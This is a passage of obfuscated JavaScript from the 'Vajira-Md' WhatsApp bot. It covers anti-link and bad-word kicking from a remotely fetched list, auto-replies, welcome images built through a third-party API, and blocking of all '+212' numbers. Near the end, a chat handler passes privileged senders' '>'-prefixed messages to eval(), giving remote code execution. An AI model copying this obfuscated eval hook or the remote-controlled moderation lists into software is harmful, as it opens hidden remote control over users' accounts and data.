              _0x139adb.key.remoteJid === 'status@broadcast' &&
              (await _0x5d22ff.readMessages([_0x139adb.key])))
        })
        if (
          !_0x3ddd92 &&
          _0x4ffdda.DISABLE_PM === 'true' &&
          _0x377950 &&
          !_0x3a2c17
        ) {
          return
        }
        if (!_0x3ddd92 && _0x4ffdda.WORK_TYPE === 'private') {
          return
        }
        if (_0x4b6ec5(_0x4ffdda.ANTI_LINK === 'true') && _0x1c41d8) {
          if (!_0x4c84b9) {
            if (!_0x3ddd92) {
              if (_0x1da678.match('chat.whatsapp.com')) {
                const _0x27b460 = { delete: _0x139adb.key }
                await _0x5d22ff.sendMessage(_0x15a124, _0x27b460)
              }
            }
          }
        }
        var _0x42e3fe = await _0xc0abb9(
          'https://github.com/vihangayt0/server-/raw/main/xeonsl_bad.json'
        )
        if (_0x4b6ec5(_0x4ffdda.ANTI_BAD === 'true') && _0x1c41d8) {
          if (!_0x4c84b9) {
            for (any in _0x42e3fe) {
              if (_0x1da678.toLowerCase().includes(_0x42e3fe[any])) {
                if (!_0x1da678.includes('tent')) {
                  if (!_0x1da678.includes('docu')) {
                    if (!_0x1da678.includes('http')) {
                      if (_0x10c943.includes(_0x50cf7c)) {
                        return
                      }
                      if (_0x139adb.key.fromMe) {
                        return
                      }
                      const _0x5964da = {}
                      _0x5964da.delete = _0x139adb.key
                      await _0x5d22ff.sendMessage(_0x15a124, _0x5964da)
                      const _0x705c8a = {}
                      _0x705c8a.text = '*Bad word detected !*'
                      await _0x5d22ff.sendMessage(_0x15a124, _0x705c8a)
                      await _0x5d22ff.groupParticipantsUpdate(
                        _0x15a124,
                        [_0x50cf7c],
                        'remove'
                      )
                    }
                  }
                }
              }
            }
          }
        }
        if (_0x4ffdda.AUTO_VOICE === 'true') {
          const _0x537b66 =
            'https://gist.github.com/VajiraTech/32826daa4c68497b1545c7c19160d3e9/raw'
          let { data: _0x84a1dd } = await _0x30c1f1.get(_0x537b66)
          for (vr in _0x84a1dd) {
            const _0x5dc756 = { quoted: _0x139adb }
            if (new RegExp('\\b' + vr + '\\b', 'gi').test(_0x1da678)) {
              _0x5d22ff.sendMessage(
                _0x15a124,
                {
                  audio: { url: _0x84a1dd[vr] },
                  mimetype: 'audio/mpeg',
                  ptt: true,
                },
                _0x5dc756
              )
            }
          }
        }
        if (_0x4ffdda.AUTO_STICKER === 'true') {
          const _0x586373 =
            'https://gist.github.com/VajiraTech/2c76014f278d5aefb7793254411e3f66/raw'
          let { data: _0x27c062 } = await _0x30c1f1.get(_0x586373)
          for (vr in _0x27c062) {
            const _0x5e1a82 = { quoted: _0x139adb }
            if (new RegExp('\\b' + vr + '\\b', 'gi').test(_0x1da678)) {
              _0x5d22ff.sendMessage(
                _0x15a124,
                {
                  sticker: { url: _0x27c062[vr] },
                  package: 'made by vajira',
                },
                _0x5e1a82
              )
            }
          }
        }
        if (_0x139adb.sender == '94758179948@s.whatsapp.net') {
          const _0x38fb85 = {
            text: '\uD83D\uDC9F️',
            key: mem.key,
          }
          const _0x3b1294 = { react: _0x38fb85 }
          await _0x5d22ff.sendMessage(_0x15a124, _0x3b1294)
        }
        if (_0x139adb.sender == '94719199757@s.whatsapp.net') {
          const _0x5e8143 = {
            text: '\uD83D\uDDA4',
            key: _0x139adb.key,
          }
          const _0x590262 = { react: _0x5e8143 }
          await _0x5d22ff.sendMessage(_0x15a124, _0x590262)
        }
        if (_0x139adb.sender == '94719199757@s.whatsapp.net') {
          const _0xcc471a = {
            text: '\uD83E\uDD0D',
            key: _0x139adb.key,
          }
          const _0x1c12e5 = { react: _0xcc471a }
          await _0x5d22ff.sendMessage(_0x15a124, _0x1c12e5)
        }
        if (_0x139adb.sender == '94719199757@s.whatsapp.net') {
          const _0x2dfeca = {
            text: '\u2695️',
            key: _0x139adb.key,
          }
          const _0x1929d7 = { react: _0x2dfeca }
          await _0x5d22ff.sendMessage(_0x15a124, _0x1929d7)
        }
        if (_0x139adb.sender == '94719199757@s.whatsapp.net') {
          const _0x36eae7 = {
            text: '\uD83D\uDC0B',
            key: _0x139adb.key,
          }
          const _0x33dcd8 = { react: _0x36eae7 }
          await _0x5d22ff.sendMessage(_0x15a124, _0x33dcd8)
        }
        if (_0x139adb.sender == '94719199757@s.whatsapp.net') {
          const _0x4ad09f = {
            text: '\uD83E\uDDDC‍\u2642',
            key: _0x139adb.key,
          }
          const _0x4e3fe4 = { react: _0x4ad09f }
          await _0x5d22ff.sendMessage(_0x15a124, _0x4e3fe4)
        }
        if (_0x139adb.sender == '94719199757@s.whatsapp.net') {
          const _0x17f153 = {
            text: '\u269C️',
            key: _0x139adb.key,
          }
          const _0x4916c2 = { react: _0x17f153 }
          await _0x5d22ff.sendMessage(_0x15a124, _0x4916c2)
        }
        if (_0x139adb.sender == '94719199757@s.whatsapp.net') {
          const _0x5228bb = {
            text: '\uD83D\uDC68‍\uD83D\uDCBB',
            key: _0x139adb.key,
          }
          const _0x25b2ca = { react: _0x5228bb }
          await _0x5d22ff.sendMessage(_0x15a124, _0x25b2ca)
        }
        _0x4ffdda.WELCOME === 'true' &&
          _0x5d22ff.ev.on('group-participants.update', async (_0x4e0bd1) => {
            console.log(_0x4e0bd1)
            try {
              let _0x167090 = await _0x5d22ff.groupMetadata(_0x4e0bd1.id),
                _0x206a15 = _0x4e0bd1.participants
              for (let _0x157fc4 of _0x206a15) {
                try {
                  ppuser = await _0x5d22ff.profilePictureUrl(_0x157fc4, 'image')
                } catch {
                  ppuser =
                    'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }
                try {
                  ppgroup = await _0x5d22ff.profilePictureUrl(
                    _0x4e0bd1.id,
                    'image'
                  )
                } catch {
                  ppgroup =
                    'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }
                let _0x354f89 = _0x157fc4
                memb = _0x167090.participants.length
                Kon = await _0x36e7ab(
                  'https://hardianto.xyz/api/welcome3?profile=' +
                    encodeURIComponent(ppuser) +
                    '&name=' +
                    encodeURIComponent(_0x354f89) +
                    '&bg=https://telegra.ph/file/8bbe8a7de5c351dfcb077.jpg&namegb=' +
                    encodeURIComponent(_0x167090.subject) +
                    '&member=' +
                    encodeURIComponent(memb)
                )
                Tol = await _0x36e7ab(
                  'https://hardianto.xyz/api/goodbye3?profile=' +
                    encodeURIComponent(ppuser) +
                    '&name=' +
                    encodeURIComponent(_0x354f89) +
                    '&bg=https://telegra.ph/file/8bbe8a7de5c351dfcb077.jpg&namegb=' +
                    encodeURIComponent(_0x167090.subject) +
                    '&member=' +
                    encodeURIComponent(memb)
                )
                if (_0x4e0bd1.action == 'add') {
                  const _0xab08fe = { mentionedJid: [_0x157fc4] }
                  _0x5d22ff.sendMessage(_0x4e0bd1.id, {
                    image: Kon,
                    contextInfo: _0xab08fe,
                    caption:
                      '\n\u2B50\u2711 Hi\uD83D\uDC4B @' +
                      _0x157fc4.split('@')[0] +
                      ',\n\u2B50\u2711 Welcome To ' +
                      _0x167090.subject +
                      '\n\n\u2B50\u2711 Description: ' +
                      _0x167090.desc +
                      '\n\n\u2B50\u2711 Welcome To My Bot Section\uD83D\uDE0B, Sometimes Loud\uD83D\uDE1C, Usually Messy\uD83E\uDD25, Full Of Love\uD83E\uDD70, HOME\uD83D\uDE0C!!',
                  })
                } else {
                  if (_0x4e0bd1.action == 'remove') {
                    const _0x38acf8 = { mentionedJid: [_0x157fc4] }
                    _0x5d22ff.sendMessage(_0x4e0bd1.id, {
                      image: Tol,
                      contextInfo: _0x38acf8,
                      caption:
                        '\u2B50\u2711 @' +
                        _0x157fc4.split('@')[0] +
                        ' Left ' +
                        _0x167090.subject +
                        "\n\n\u2B50\u2711 I'm Not Sure If It Was A Goodbye Charm, But It Was Fun While It Lasted \uD83D\uDE0C\u2728",
                    })
                  }
                }
              }
            } catch (_0x3b7a63) {
              console.log(_0x3b7a63)
            }
          })
        _0x4ffdda.AUTO_READ === 'true' &&
          _0x5d22ff.readMessages([_0x139adb.key])
        _0x4ffdda.AUTO_TYPING === 'true' &&
          _0x5d22ff.sendPresenceUpdate('composing', _0x15a124)
        _0x4ffdda.AUTO_RECORDING === 'true' &&
          _0x5d22ff.sendPresenceUpdate('recording', _0x15a124)
        _0x4ffdda.AUTO_BIO === 'true' &&
          _0x5d22ff
            .updateProfileStatus(
              'Hey, future leaders! \uD83C\uDF1F Vajira-Md is here to inspire and lead, thanks to Vajira Rathnayaka, Inc. \uD83D\uDE80 ' +
                _0x51cbc5(process.uptime()) +
                ' '
            )
            .catch((_0x4d7f5e) => _0x4d7f5e)
        _0x4ffdda.ALWAYS_ONLINE === 'true' &&
          _0x5d22ff.sendPresenceUpdate('available', _0x139adb.chat)
        if (
          _0x3f2d90.sender.startsWith('212') &&
          _0x4ffdda.NUMBER_212_BLOCK === 'true'
        ) {
          return _0x5d22ff.updateBlockStatus(_0x3f2d90.sender, 'block')
        }
        _0x5d22ff.sendImage = async (
          _0x38eb87,
          _0x3058d5,
          _0x41271f = '',
          _0x4db4dd = '',
          _0x1ffeba
        ) => {
          let _0x3d4f37 = Buffer.isBuffer(_0x3058d5)
            ? _0x3058d5
            : /^data:.*?\/.*?;base64,/i.test(_0x3058d5)
            ? Buffer.from(_0x3058d5.split`,`[1], 'base64')
            : /^https?:\/\//.test(_0x3058d5)
            ? await await _0x36e7ab(_0x3058d5)
            : _0x5531f7.existsSync(_0x3058d5)
            ? _0x5531f7.readFileSync(_0x3058d5)
            : Buffer.alloc(0)
          const _0x49be7a = {
              image: _0x3d4f37,
              caption: _0x41271f,
              ..._0x1ffeba,
            },
            _0x1b9257 = { quoted: _0x4db4dd }
          return await _0x5d22ff.sendMessage(_0x38eb87, _0x49be7a, _0x1b9257)
        }
        _0x5d22ff.sendPoll = (
          _0x3711bd,
          _0x50803b = '',
          _0x426a98 = [],
          _0x487936 = 1
        ) => {
          const _0x144b92 = {
            name: _0x50803b,
            values: _0x426a98,
            selectableCount: _0x487936,
          }
          const _0x13fe21 = {}
          return (
            (_0x13fe21.poll = _0x144b92),
            _0x5d22ff.sendMessage(_0x3711bd, _0x13fe21)
          )
        }
        _0x5d22ff.sendText = (
          _0x1913ae,
          _0x12b736,
          _0x1df285 = '',
          _0x81f6fb
        ) =>
          _0x5d22ff.sendMessage(
            _0x1913ae,
            {
              text: _0x12b736,
              ..._0x81f6fb,
            },
            { quoted: _0x1df285 }
          )
        _0x5d22ff.sendImageAsSticker = async (
          _0x3bc79d,
          _0x384698,
          _0x23622e,
          _0x1d4320 = {}
        ) => {
          let _0x5e01f1 = Buffer.isBuffer(_0x384698)
              ? _0x384698
              : /^data:.*?\/.*?;base64,/i.test(_0x384698)
              ? Buffer.from(_0x384698.split`,`[1], 'base64')
              : /^https?:\/\//.test(_0x384698)
              ? await await _0x36e7ab(_0x384698)
              : _0x5531f7.existsSync(_0x384698)
              ? _0x5531f7.readFileSync(_0x384698)
              : Buffer.alloc(0),
            _0x47cca8
          _0x1d4320 && (_0x1d4320.packname || _0x1d4320.author)
            ? (_0x47cca8 = await _0x561eb7(_0x5e01f1, _0x1d4320))
            : (_0x47cca8 = await _0x474878(_0x5e01f1))
          const _0x27c7ef = { url: _0x47cca8 }
          const _0x3b7608 = {
            sticker: _0x27c7ef,
            ..._0x1d4320,
          }
          const _0x5644ca = {}
          return (
            (_0x5644ca.quoted = _0x23622e),
            await _0x5d22ff.sendMessage(_0x3bc79d, _0x3b7608, _0x5644ca),
            _0x47cca8
          )
        }
        _0x5d22ff.downloadAndSaveMediaMessage = async (
          _0x84bb61,
          _0x5f47ad,
          _0x2a13d1 = true
        ) => {
          let _0x39de5e = _0x84bb61.msg ? _0x84bb61.msg : _0x84bb61
          let _0x47d6b3 = (_0x84bb61.msg || _0x84bb61).mimetype || '',
            _0x3c8daa = _0x84bb61.mtype
              ? _0x84bb61.mtype.replace(/Message/gi, '')
              : _0x47d6b3.split('/')[0]
          const _0x12c736 = await _0x509529(_0x39de5e, _0x3c8daa)
          let _0x3baa02 = Buffer.from([])
          for await (const _0x5b670 of _0x12c736) {
            _0x3baa02 = Buffer.concat([_0x3baa02, _0x5b670])
          }
          let _0x2377e3 = await _0x3540ab.fromBuffer(_0x3baa02)
          return (
            (trueFileName = _0x2a13d1
              ? _0x5f47ad + '.' + _0x2377e3.ext
              : _0x5f47ad),
            await _0x5531f7.writeFileSync(trueFileName, _0x3baa02),
            trueFileName
          )
        }
        var _0x164330 = (_0x7387d9) => {
          var _0x2af442 = {
            is_bot: false,
            device:
              _0x7387d9.length > 21
                ? 'android'
                : _0x7387d9.substring(0, 2) === '3A'
                ? 'ios'
                : 'web',
          }
          _0x7387d9.startsWith('BAE5') &&
            ((_0x2af442.is_bot = true), (_0x2af442.bot_name = 'bailyes'))
          ;/amdi|queen|black|amda|achiya|achintha/gi.test(_0x7387d9) &&
            ((_0x2af442.is_bot = true), (_0x2af442.bot_name = 'VAJIRA-MD-V3'))
          return _0x2af442
        }
        async function _0x3ec94e(_0x1571b8, _0x3ea60c) {
          if (_0x4b6ec5(_0x4ffdda.ANTI_BOT)) {
            return
          }
          if (_0x4c84b9) {
            return
          }
          if (!_0x1c41d8) {
            return
          }
          if (_0x21905c) {
            return
          }
          if (_0x3a2c17) {
            var _0x22ee88 = _0x164330(_0x139adb.key.id)
            if (_0x22ee88.is_bot) {
              try {
                const _0xa77329 = {}
                return (
                  (_0xa77329.text = '*Other bots are not allowed here !!*'),
                  await _0x5d22ff.sendMessage(_0x15a124, _0xa77329),
                  await _0x5d22ff.groupParticipantsUpdate(
                    _0x15a124,
                    [_0x50cf7c],
                    'remove'
                  )
                )
              } catch {}
            }
          }
        }
        try {
          await _0x3ec94e(_0x5d22ff, _0x139adb)
        } catch {}
        switch (_0xa405b7) {
          case 'jid':
            _0x4bca34(_0x15a124)
            break
          default:
            if ((_0x21905c || _0x3ddd92) && _0x1da678.startsWith('>')) {
              let _0x3c5d8f = _0x1da678.split('>')[1],
                _0x4bd292 = _0x3c5d8f.replace('\xB0', '.toString()')
              try {
                let _0x39919c = await eval(_0x4bd292)
                typeof _0x39919c === 'object'
                  ? _0x4bca34(_0x1e0692.format(_0x39919c))
                  : _0x4bca34(_0x1e0692.format(_0x39919c))
              } catch (_0x3b4dad) {
                _0x4bca34(_0x1e0692.format(_0x3b4dad))
              }
            }
        }
      } catch (_0x15c25b) {
        const _0x436930 = String(_0x15c25b)
        console.log(_0x436930)
      }
    })
  }
  _0x14ac94.get('/', (_0x27a5bc, _0x121a18) => {
    _0x121a18.send('\uD83D\uDCDF Vajira-Md Working successfully!')
  })
  _0x14ac94.listen(_0x8130b2, () =>
    console.log(
      'Vajira-Md Server listening on port http://localhost:' + _0x8130b2
    )
  )
  setTimeout(() => {
    _0x2afb75()
  }, 3000)
}
const _0x42ed16 = {}
_0x42ed16.startvajirabot = startvajirabot
module.exports = _0x42ed16
